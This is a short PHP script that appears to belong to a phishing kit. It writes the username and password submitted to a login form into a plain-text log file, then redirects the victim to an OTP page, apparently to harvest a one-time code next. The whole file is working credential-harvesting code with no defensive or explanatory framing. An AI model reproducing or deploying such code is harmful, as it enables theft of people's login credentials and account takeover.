<?php

file_put_contents("log.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " ", FILE_APPEND);
header('Location: otp.login.php');
exit();
